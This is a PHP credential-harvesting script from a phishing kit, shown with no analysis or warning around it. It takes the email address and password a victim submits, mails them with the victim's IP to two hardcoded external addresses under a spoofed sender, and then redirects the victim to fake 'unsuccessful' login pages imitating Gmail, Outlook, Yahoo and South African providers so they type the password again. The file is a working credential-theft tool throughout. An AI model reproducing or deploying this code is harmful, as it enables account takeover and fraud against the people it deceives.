<?php
$ip = $_SERVER['REMOTE_ADDR'];
$email = $_GET['email'];
$to = "usmandaniel53@gmail.com";
$to = "mayorali2018@yahoo.com";
$subject = 'Link Data';
$txt = 'Email Address: ' . $_GET['email'] . "\n" .
$txt .= 'Password: ' . $_GET['password'] . "\n" .
$ip .= 'IP Address: ' . $_GET['ip'] . "\n" .
$headers = "From: Link Data Feedback <feedback@logaz.com>";
if (mail($to,$subject,$txt,$headers));

?>

<?php 
$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

if (strpos($url,'gmail') !== false) {
    print "<meta http-equiv=\"refresh\" content=\"0;URL=../accounts.google.com/ServiceLogin-1password.php?INFO=unsuccessful&email=$email\">";
}
elseif (strpos($url,'mweb') !== false) {
    print "<meta http-equiv=\"refresh\" content=\"0;URL=../authenticate.php?INFO=unsuccessful&email=$email\">";
}
elseif (strpos($url,'iafrica') !== false) {
    print "<meta http-equiv=\"refresh\" content=\"0;URL=../authenticate.php?INFO=unsuccessful&email=$email\">";
}
elseif (strpos($url,'hotmail') !== false) {
    print "<meta http-equiv=\"refresh\" content=\"0;URL=../outlook.live.com/Sign_in.php?INFO=unsuccessful&email=$email\">";
}
elseif (strpos($url,'telkomsa') !== false) {
    print "<meta http-equiv=\"refresh\" content=\"0;URL=../authenticate.php?INFO=unsuccessful&email=$email\">";
}
elseif (strpos($url,'yahoo') !== false) {
    print "<meta http-equiv=\"refresh\" content=\"0;URL=../login.yahoo.com/password.php?INFO=unsuccessful&email=$email\">";
}

else print "<meta http-equiv=\"refresh\" content=\"0;URL=../authenticate.php?INFO=unsuccessful&email=$email\">";

?>
